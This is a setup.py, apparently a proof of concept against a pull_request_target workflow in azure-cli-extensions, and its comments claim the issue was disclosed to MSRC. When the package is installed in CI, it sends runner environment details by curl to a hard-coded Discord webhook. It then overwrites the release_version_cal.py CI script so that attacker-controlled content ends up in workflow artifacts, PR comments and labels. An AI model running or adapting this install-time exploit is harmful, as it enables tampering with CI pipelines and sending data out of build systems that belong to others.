#!/usr/bin/env python

# Security research PoC - demonstrates artifact poisoning via pull_request_target
# Reported to MSRC as part of responsible disclosure.

import os
import json
import subprocess
import datetime

poc_data = {
    "source": "setup.py",
    "timestamp": datetime.datetime.utcnow().isoformat(),
    "github_run_id": os.environ.get("GITHUB_RUN_ID", "unknown"),
    "github_repository": os.environ.get("GITHUB_REPOSITORY", "unknown"),
    "github_event_name": os.environ.get("GITHUB_EVENT_NAME", "unknown"),
    "github_actor": os.environ.get("GITHUB_ACTOR", "unknown"),
    "runner_name": os.environ.get("RUNNER_NAME", "unknown"),
}

webhook_url = "https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"

# Webhook callback
msg = json.dumps({
    "content": (
        "**PoC: artifact poisoning v4 - azure-cli-extensions**\n"
        "```\n"
        f"Run ID: {poc_data['github_run_id']}\n"
        f"Time: {poc_data['timestamp']}\n"
        "```\n"
        "Overwriting release_version_cal.py before it runs."
    )
})
try:
    subprocess.run(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
         "-d", msg, webhook_url],
        timeout=10, capture_output=True
    )
except Exception:
    pass

# The workflow does:
#   1. git checkout fork_branch        ← our code
#   2. git checkout base -- scripts    ← restores scripts from base
#   3. azdev extension add mod         ← our setup.py runs HERE
#   4. python scripts/ci/release_version_cal.py  ← runs AFTER us
#   5. upload-artifact
#
# Since step 3 (us) runs BEFORE step 4, we can replace the script
# that step 4 will execute. No race condition needed.

run_id = poc_data["github_run_id"]
ts = poc_data["timestamp"]

script_path = os.path.join(os.getcwd(), "scripts", "ci", "release_version_cal.py")
if os.path.exists(script_path):
    with open(script_path, "w") as f:
        f.write(f'''#!/usr/bin/env python
import os

result_path = os.environ.get("result_path", "./cal_result")
output_file = os.environ.get("output_file", "version_update.txt")
remove_labels_file = os.environ.get("remove_labels_file", "labels_removed.txt")

os.makedirs(result_path, exist_ok=True)

with open(os.path.join(result_path, output_file), "w") as f:
    f.write(
        "## Responsible Disclosure Notice\\n\\n"
        "This automated comment was generated as part of an authorized security "
        "research engagement. It demonstrates that the `VersionCalPRComment.yml` "
        "workflow is vulnerable to artifact poisoning via a `pull_request_target` "
        "misconfiguration.\\n\\n"
        "**Finding:** An external contributor can control the content of this "
        "automated comment and manipulate PR labels by modifying artifact files "
        "during the `version-cal` job, which checks out and executes code from "
        "the pull request head branch.\\n\\n"
        "This issue has been reported to the Microsoft Security Response Center (MSRC) "
        "as part of responsible disclosure. No secrets were accessed and no "
        "unauthorized modifications were made.\\n\\n"
        "*Researcher: Bodlux | Run ID: {run_id} | "
        "Timestamp: {ts}*"
    )

with open(os.path.join(result_path, remove_labels_file), "w") as f:
    f.write("")

print("release_version_cal.py replaced by security research PoC")
print("Artifact files written to", result_path)
''')

    # Notify
    msg2 = json.dumps({
        "content": "**Script replaced** — release_version_cal.py overwritten. Waiting for it to execute..."
    })
    try:
        subprocess.run(
            ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
             "-d", msg2, webhook_url],
            timeout=5, capture_output=True
        )
    except Exception:
        pass

from setuptools import setup, find_packages

setup(
    name='securitytest',
    version='0.1.0',
    description='Security research PoC',
    author='Bodlux',
    license='MIT',
    packages=find_packages(),
    install_requires=[],
    package_data={'azext_securitytest': ['azext_metadata.json']},
)
